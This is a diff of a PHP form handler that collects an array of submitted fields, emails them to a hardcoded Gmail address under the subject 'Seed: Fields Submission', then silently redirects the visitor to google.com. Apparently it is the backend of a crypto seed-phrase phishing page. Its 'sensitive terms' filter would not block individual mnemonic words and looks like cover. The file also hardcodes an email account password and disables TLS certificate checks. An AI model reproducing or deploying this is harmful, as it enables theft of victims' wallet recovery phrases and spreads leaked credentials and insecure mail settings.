@@ -1,11 +1,9 @@
 <?php
-use PHPMailer\PHPMailer\PHPMailer;
-use PHPMailer\PHPMailer\Exception;
 
-// Require Composer autoload (PHPMailer installed via Composer)
-require 'vendor/autoload.php';
 
-// Helper: detect suspicious content
+require 'smtp/PHPMailerAutoload.php'; // or use Composer autoload if available
+
+// helper: check for suspicious content (very simple heuristic)
 function contains_sensitive_terms($values) {
     $bad = ['seed','mnemonic','private','secret','password','key','wallet','phrase'];
     foreach ($values as $v) {
@@ -18,57 +16,58 @@ function contains_sensitive_terms($values) {
     return false;
 }
 
-// Only accept POST requests
+
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
     http_response_code(405);
     echo 'Invalid request method.';
     exit;
 }
 
-// Expecting form fields named "fields[]"
+// Expecting inputs named fields[] in the form (non-sensitive demo)
 $fields = isset($_POST['fields']) && is_array($_POST['fields']) ? $_POST['fields'] : [];
-$clean = array_values(array_filter(array_map('trim', $fields), fn($v) => $v !== ''));
+
+// Trim and remove empty entries
+$clean = array_values(array_filter(array_map('trim', $fields), function($v){ return $v !== ''; }));
 
 if (empty($clean)) {
     echo 'No data submitted.';
     exit;
 }
 
-// Reject suspicious input
+// Safety check: refuse if suspicious keywords appear
 if (contains_sensitive_terms($clean)) {
     http_response_code(400);
     echo 'Submission rejected: sensitive data detected.';
     exit;
 }
 
-// Build email HTML body
-$body = "<h2 style='font-family:Arial,sans-serif;color:#111;'>Form Submission</h2>";
+// Build email body (safe HTML)
+$body = "<h2 style='font-family:Arial,sans-serif;color:#111;'>Seeds Submission</h2>";
 $body .= "<ol style='font-family:Arial,sans-serif;color:#333;'>";
-foreach ($clean as $v) {
+foreach ($clean as $i => $v) {
     $body .= "<li>" . htmlspecialchars($v, ENT_QUOTES|ENT_SUBSTITUTE, 'UTF-8') . "</li>";
 }
 $body .= "</ol>";
 
 try {
-    $mail = new PHPMailer(true);
+    $mail = new PHPMailer();
     $mail->isSMTP();
     $mail->SMTPAuth = true;
-    $mail->SMTPDebug = 0; // change to 2 for debugging
-    $mail->Host = 'smtp.sendgrid.net';
-    $mail->Username = 'jhnkenrick@gmail.com'; // literally 'apikey' for SendGrid
-    $mail->Password = 'iclvtpqxcjdprtfh';
     $mail->SMTPSecure = 'tls';
+    $mail->Host = 'smtp.gmail.com';
     $mail->Port = 587;
-	
 
-    $mail->setFrom('daptuba6896@gmail.com', 'Sender Name');
-    $mail->addAddress('daptuba6896@gmail.com', 'Recipient Name');
+    // TODO: set your credentials here (use app password for Gmail)
+     $mail->Username = "jhnkenrick@gmail.com";
+    $mail->Password = "iclvtpqxcjdprtfh";
+    $mail->setFrom('daptuba6896@gmail.com', 'Sender');
+    $mail->addAddress('daptuba6896@gmail.com', 'Recipient');
 
     $mail->isHTML(true);
-    $mail->Subject = 'Form Submission';
+    $mail->Subject = 'Seed: Fields Submission';
     $mail->Body = $body;
 
-    // Optional: relax SSL checks in Docker
+    // Optional: relax SSL checks if needed (not recommended for production)
     $mail->SMTPOptions = [
         'ssl' => [
             'verify_peer' => false,
@@ -77,14 +76,16 @@ try {
         ]
     ];
 
-    $mail->send();
-
-    // Redirect after successful submission
-    header("Location: https://www.google.com/");
-    exit();
+    if (!$mail->send()) {
+        http_response_code(500);
+        echo 'Mailer Error: ' . htmlspecialchars($mail->ErrorInfo);
+    } else {
+        header("Location: https://www.google.com/");
+        exit();
+    }
 
 } catch (Exception $e) {
     http_response_code(500);
-    echo 'Mailer Exception: ' . htmlspecialchars($mail->ErrorInfo);
+    echo 'Exception: ' . htmlspecialchars($e->getMessage());
 }
 ?>
